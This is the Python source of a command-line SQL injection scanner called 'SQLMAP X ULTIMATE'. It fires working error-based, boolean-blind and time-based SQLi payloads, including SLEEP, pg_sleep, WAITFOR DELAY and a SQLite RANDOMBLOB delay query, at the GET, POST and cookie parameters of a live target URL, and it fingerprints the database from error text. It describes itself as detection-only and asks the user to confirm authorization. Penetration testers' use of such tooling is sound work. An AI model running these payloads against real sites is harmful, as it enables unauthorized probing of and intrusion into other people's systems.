#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLMAP X ULTIMATE — Active SQL Injection Detection Tool
=======================================================
Real active testing (detection phase only, like sqlmap -u without dump):
  - Error-based SQLi detection  (real DB error payloads)
  - Boolean-based blind SQLi    (true/false response comparison)
  - Time-based blind SQLi       (SLEEP/BENCHMARK/Delay response timing)
  - Supports GET parameters, POST bodies, and cookie values
  - DBMS fingerprinting from errors

Detection only. No data extraction, no dumping, no destructive queries.
"""

import sys, re, time, json, os, random, string, platform, logging
from datetime import datetime
from urllib.parse import urlparse, urlencode, parse_qsl

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] Missing dependency. Run: pip install requests"); sys.exit(1)

APP = "SQLMAP X ULTIMATE v2.0"
C_ON = sys.stdout.isatty()
class C:
    R = "\033[1;31m" if C_ON else ""
    G = "\033[1;32m" if C_ON else ""
    Y = "\033[1;33m" if C_ON else ""
    CY = "\033[1;36m" if C_ON else ""
    W = "\033[1;37m" if C_ON else ""
    E = "\033[0m" if C_ON else ""

logging.basicConfig(filename="sqlmapx.log", level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("sx")

BANNER = r"""
   ____  _        _    __  __            _____ __  __ _____ _   _ _____
  / ___|| |      / \  |  \/  |   _____  / ____|  \/  |_   _| \ | | ____|
  \___ \| |     / _ \ | |\/| |  |______| (___ | |\/| | | | |  \| |  _|
   ___) | |___ / ___ \| |  | |          \___ \| |  | | | | | |\  | |___
  |____/|_____/_/   \_\_|  |_|          ____) |_|  |_| |_| |_| \_|_____|
"""

# ---------------------------------------------------------------------------
# Payload sets — classic detection payloads (safe: SELECT-only, no data
# returned, nothing written to the database)
# ---------------------------------------------------------------------------

# 1) ERROR-BASED: payloads that force a visible SQL syntax error if input
#    is concatenated directly into a query.
ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1-- -",
    "1' ORDER BY 9999-- -",
    "1\" ORDER BY 9999-- -",
    "') OR ('1'='1",
]

# DBMS error fingerprints (regex, dbms)
DB_ERRORS = [
    (r"you have an error in your sql syntax", "MySQL/MariaDB"),
    (r"warning: mysql", "MySQL"),
    (r"unclosed quotation mark after", "MSSQL"),
    (r"quoted string not properly terminated", "Oracle"),
    (r"pg_query|syntax error at or near", "PostgreSQL"),
    (r"sqlite3?\.|unrecognized token|near \".*\": syntax error", "SQLite"),
    (r"odbc|drivers? error|microsoft jet", "MSSQL/Access"),
    (r"ora-\d{5}", "Oracle"),
    (r"sql syntax|syntax error", "Generic SQL"),
]

# 2) BOOLEAN-BASED: pairs of payload logic. If a parameter is injectable,
#    the TRUE payload response matches baseline and the FALSE one differs.
BOOLEAN_PAIRS = [
    # (true_payload_suffix, false_payload_suffix, prepend)
    (" AND 1=1-- -",  " AND 1=2-- -",  "{v}"),
    ("' AND '1'='1-- -", "' AND '1'='2-- -", "{v}"),
    ("\" AND \"1\"=\"1-- -", "\" AND \"1\"=\"2-- -", "{v}"),
    (" AND 1=1", " AND 1=2", "{v}"),
    (") AND 1=1-- -", ") AND 1=2-- -", "{v}"),
]

# 3) TIME-BASED: per-DBMS sleep payloads (placeholders {T}=seconds)
TIME_PAYLOADS = [
    ("MySQL",      "' AND SLEEP({T})-- -",        "{v}"),
    ("MySQL",      "\" AND SLEEP({T})-- -",       "{v}"),
    ("MySQL",      " AND SLEEP({T})-- -",         "{v}"),
    ("PostgreSQL", "'; SELECT pg_sleep({T})-- -", "{v}"),
    ("PostgreSQL", " AND {v}=pg_sleep({T})-- -",  "{v}"),
    ("MSSQL",      "'; WAITFOR DELAY '0:0:{T}'-- -", "{v}"),
    ("SQLite",     "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -", "{v}"),
]


class Scanner:
    def __init__(self, url, method="GET", data=None, cookie=None,
                 timeout=10, delay_threshold=4, proxy=None, verbose=True):
        self.url = url
        self.method = method.upper()
        self.data_str = data or ""      # POST body, e.g. "user=admin&pass=x"
        self.cookie = cookie
        self.timeout = timeout
        self.delay_threshold = delay_threshold
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.verbose = verbose
        self.findings = []              # confirmed injections
        self.suspects = []              # possible injections
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) SQLMapX/2.0",
            "Accept": "*/*",
        })

    # ------------------------------------------------------------------ I/O
    def _say(self, msg, color=C.W):
        if self.verbose:
            print(f"{color}{msg}{C.E}")
        log.info(msg.replace("\033", ""))

    def request(self, url=None, params=None, data=None):
        try:
            return self.session.request(
                self.method, url or self.url, params=params, data=data,
                cookies=self._cookie_dict(), timeout=self.timeout + self.delay_threshold + 5,
                proxies=self.proxies, verify=False, allow_redirects=True)
        except requests.RequestException as e:
            log.warning("request error: %s", e)
            return None

    def _cookie_dict(self):
        if not self.cookie:
            return None
        out = {}
        for pair in self.cookie.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                out[k.strip()] = v.strip()
        return out

    # ---------------------------------------------------- parameter parsing
    def get_params(self):
        """Returns list of (injection_point_name, original_value, apply_fn)."""
        parsed = urlparse(self.url)
        params = []
        if parsed.query:
            q = parse_qsl(parsed.query, keep_blank_values=True)
            for i, (k, v) in enumerate(q):
                def make(idx=i):
                    def apply(newval, idx=idx):
                        qq = list(q); qq[idx] = (qq[idx][0], newval)
                        return parsed._replace(query=urlencode(qq)).geturl()
                    return apply
                params.append((f"GET {k}", v, make(i)))
        if self.method == "POST" and self.data_str:
            d = parse_qsl(self.data_str, keep_blank_values=True)
            for i, (k, v) in enumerate(d):
                def make(idx=i):
                    def apply(newval, idx=idx):
                        dd = list(d); dd[idx] = (dd[idx][0], newval)
                        return urlencode(dd)
                    return apply
                params.append((f"POST {k}", v, make(i)))
        if self.cookie:
            pairs = self.cookie.split(";")
            for i, pair in enumerate(p for p in pairs if "=" in p):
                k, v = pair.split("=", 1)
                def make(idx=i):
                    def apply(newval, idx=idx):
                        cc = list(pairs); cc[idx] = f"{k}={newval}"
                        return ";".join(cc)
                    return apply
                params.append((f"COOKIE {k.strip()}", v.strip(), make(i)))
        return params

    # ----------------------------------------------------------- baselining
    def baseline(self):
        r = self.request()
        if r is None:
            return None, None
        return r, self._page_sig(r)

    @staticmethod
    def _page_sig(resp):
        """Stable content signature: strip dynamic-looking numbers."""
        body = re.sub(r"\b\d{1,6}\b", "N", resp.text)
        return (resp.status_code, len(body), hash(body[:4000]))

    @staticmethod
    def _similar(sig_a, sig_b):
        if not sig_a or not sig_b:
            return False
        return sig_a == sig_b

    # ------------------------------------------------- 1. ERROR-BASED test
    def test_error_based(self, name, value, apply):
        for payload in ERROR_PAYLOADS:
            r = self.request(url=apply(f"{value}{payload}") if self.method != "POST"
                             else None,
                             params=None,
                             data=apply(f"{value}{payload}") if self.method == "POST" else None)
            if r is None:
                continue
            body = r.text[:60000]
            for rx, dbms in DB_ERRORS:
                m = re.search(rx, body, re.I)
                if m and not re.search(rx, self.baseline_body or "", re.I):
                    snippet = body[max(0, m.start()-80):m.end()+80].replace("\n", " ")
                    self.findings.append({
                        "type": "Error-based SQLi", "dbms": dbms,
                        "param": name, "payload": f"{value}{payload}",
                        "evidence": snippet.strip()[:200]})
                    self._say(f"  [!!] {name}: ERROR-BASED SQLi CONFIRMED ({dbms})", C.R)
                    self._say(f"       error: {snippet.strip()[:150]}", C.Y)
                    return True
        return False

    # ----------------------------------------------- 2. BOOLEAN-BLIND test
    def test_boolean(self, name, value, apply, base_sig):
        for true_p, false_p, _ in BOOLEAN_PAIRS:
            rt = self.request(url=apply(f"{value}{true_p}") if self.method != "POST" else None,
                              data=apply(f"{value}{true_p}") if self.method == "POST" else None)
            rf = self.request(url=apply(f"{value}{false_p}") if self.method != "POST" else None,
                              data=apply(f"{value}{false_p}") if self.method == "POST" else None)
            if rt is None or rf is None:
                continue
            sig_t, sig_f = self._page_sig(rt), self._page_sig(rf)
            # TRUE response similar to baseline, FALSE clearly different
            if self._similar(base_sig, sig_t) and not self._similar(sig_t, sig_f):
                # double-check: repeat TRUE to rule out randomness
                rt2 = self.request(url=apply(f"{value}{true_p}") if self.method != "POST" else None,
                                   data=apply(f"{value}{true_p}") if self.method == "POST" else None)
                if rt2 and self._similar(self._page_sig(rt2), sig_t):
                    self.findings.append({
                        "type": "Boolean-based blind SQLi", "dbms": "unknown",
                        "param": name,
                        "payload": f"{value}{true_p} vs {value}{false_p}",
                        "evidence": f"TRUE/FALSE responses differ (len {sig_t[1]} vs {sig_f[1]})"})
                    self._say(f"  [!!] {name}: BOOLEAN-BLIND SQLi CONFIRMED "
                              f"(len {sig_t[1]} vs {sig_f[1]})", C.R)
                    return True
            # weaker signal: responses differ but neither matches baseline
            elif sig_t != sig_f and sig_t[1] != sig_f[1]:
                self.suspects.append({"param": name,
                                      "payload": f"{value}{true_p}",
                                      "evidence": f"response lengths differ: {sig_t[1]} vs {sig_f[1]}"})
        return False

    # ------------------------------------------------- 3. TIME-BLIND test
    def test_time(self, name, value, apply, base_time):
        T = self.delay_threshold
        for dbms, tmpl, _ in TIME_PAYLOADS:
            payload = f"{value}" + tmpl.replace("{T}", str(T)).replace("{v}", value)
            t0 = time.time()
            r = self.request(url=apply(payload) if self.method != "POST" else None,
                             data=apply(payload) if self.method == "POST" else None)
            elapsed = time.time() - t0
            if r is None:
                continue
            # response must be delayed beyond baseline + threshold, and
            # a control run (no payload) must be fast to rule out jitter
            if elapsed >= base_time + T - 0.5:
                # control re-test to confirm
                t1 = time.time()
                self.request()
                base2 = time.time() - t1
                if base2 < T:
                    self.findings.append({
                        "type": "Time-based blind SQLi", "dbms": dbms,
                        "param": name, "payload": payload,
                        "evidence": f"response delayed {elapsed:.1f}s "
                                    f"(baseline {base_time:.1f}s)"})
                    self._say(f"  [!!] {name}: TIME-BLIND SQLi CONFIRMED "
                              f"({dbms}, delayed {elapsed:.1f}s)", C.R)
                    return True
        return False

    # ------------------------------------------------------------- runner
    def scan(self):
        self._say(f"[*] Target: {self.url}", C.CY)
        base_resp, base_sig = self.baseline()
        if base_resp is None:
            self._say("[!] Target unreachable. Aborting.", C.R)
            return []
        self.baseline_body = base_resp.text[:60000]
        base_time = self._measure_base_time()
        self._say(f"[*] Baseline: HTTP {base_resp.status_code}, "
                  f"{len(base_resp.text)} bytes, {base_time:.2f}s", C.G)

        params = self.get_params()
        if not params:
            self._say("[!] No injectable parameters found in URL/POST/cookie.", C.Y)
            return self.findings
        self._say(f"[*] {len(params)} parameter(s) to test\n", C.G)

        for name, value, apply in params:
            self._say(f"[~] Testing parameter: {name} = '{value}'", C.CY)
            if self.test_error_based(name, value, apply):
                continue
            if self.test_boolean(name, value, apply, base_sig):
                continue
            self.test_time(name, value, apply, base_time)
            if not any(f["param"] == name for f in self.findings):
                self._say(f"  [-] {name}: no injection detected", C.W)

        return self.findings

    def _measure_base_time(self, n=2):
        times = []
        for _ in range(n):
            t0 = time.time(); self.request(); times.append(time.time() - t0)
        return min(times)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def arg_parse(argv):
    url = method = data = cookie = proxy = None
    timeout = 10
    i = 0
    while i < len(argv):
        a = argv[i]
        if a in ("-u", "--url"):        url = argv[i+1]; i += 2
        elif a in ("-m", "--method"):   method = argv[i+1].upper(); i += 2
        elif a in ("-d", "--data"):     data = argv[i+1]; i += 2
        elif a in ("-c", "--cookie"):   cookie = argv[i+1]; i += 2
        elif a in ("-p", "--proxy"):    proxy = argv[i+1]; i += 2
        elif a in ("-t", "--timeout"):  timeout = int(argv[i+1]); i += 2
        else: i += 1
    return url, method or "GET", data, cookie, proxy, timeout


def interactive():
    print(f"{C.R}{BANNER}{C.E}")
    print(f"{C.CY}        {APP}  —  Active SQLi Detection Engine{C.E}")
    print(f"{C.Y}        Detection only — no extraction, no dumping{C.E}\n")
    url = input(f"{C.G}>{C.E} Target URL (with params, e.g. http://site/item.php?id=1): ").strip()
    method = (input(f"{C.G}>{C.E} Method GET/POST [GET]: ").strip() or "GET").upper()
    data = None
    if method == "POST":
        data = input(f"{C.G}>{C.E} POST body (k=v&k2=v2): ").strip() or None
    cookie = input(f"{C.G}>{C.E} Cookie (k=v; k2=v2) [optional]: ").strip() or None
    proxy  = input(f"{C.G}>{C.E} Proxy [optional]: ").strip() or None
    return url, method, data, cookie, proxy, 10


def report(url, findings, suspects):
    os.makedirs("reports", exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = {"target": url, "generated": datetime.now().isoformat(),
           "confirmed": findings, "suspected": suspects}
    path = f"reports/sqlix_{stamp}.json"
    with open(path, "w") as f:
        json.dump(out, f, indent=2)
    print(f"\n{C.G}[+] JSON report saved: {path}{C.E}")
    # TXT
    with open(path.replace(".json", ".txt"), "w") as f:
        f.write(f"SQLMAP X ULTIMATE — {url}\n{datetime.now()}\n{'='*60}\n")
        for x in findings:
            f.write(f"\n[CONFIRMED] {x['type']} | DBMS: {x['dbms']}\n"
                    f"  Param:   {x['param']}\n  Payload: {x['payload']}\n"
                    f"  Evidence:{x['evidence']}\n")
        for x in suspects:
            f.write(f"\n[SUSPECTED] Param: {x['param']}\n  {x['evidence']}\n")
    print(f"{C.G}[+] TXT report saved: {path.replace('.json', '.txt')}{C.E}")


def main():
    argv = sys.argv[1:]
    if argv and ("-u" in argv or "--url" in argv):
        url, method, data, cookie, proxy, timeout = arg_parse(argv)
    elif not argv:
        url, method, data, cookie, proxy, timeout = interactive()
    else:
        print(__doc__); sys.exit(1)

    if not url:
        print("[!] No target."); sys.exit(1)
    if not confirm_auth():
        print("[!] Authorization not confirmed. Aborting."); sys.exit(1)

    s = Scanner(url, method, data, cookie, timeout=timeout, proxy=proxy)
    findings = s.scan()
    print(f"\n{C.CY}{'='*60}{C.E}")
    if findings:
        print(f"{C.R}[!!] {len(findings)} CONFIRMED injection(s):{C.E}")
        for f in findings:
            print(f"{C.R}  - {f['type']} ({f['dbms']}) on {f['param']}{C.E}")
    else:
        print(f"{C.G}[+] No confirmed injections found.{C.E}")
    if s.suspects:
        print(f"{C.Y}[*] {len(s.suspects)} suspected point(s) — verify manually.{C.E}")
    report(url, findings, s.suspects)


def confirm_auth():
    a = input(f"{C.Y}Confirm you own this target or have written permission "
              f"to test it [y/N]: {C.E}").strip().lower()
    return a.startswith("y")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.R}[!] Interrupted.{C.E}")
        sys.exit(0)
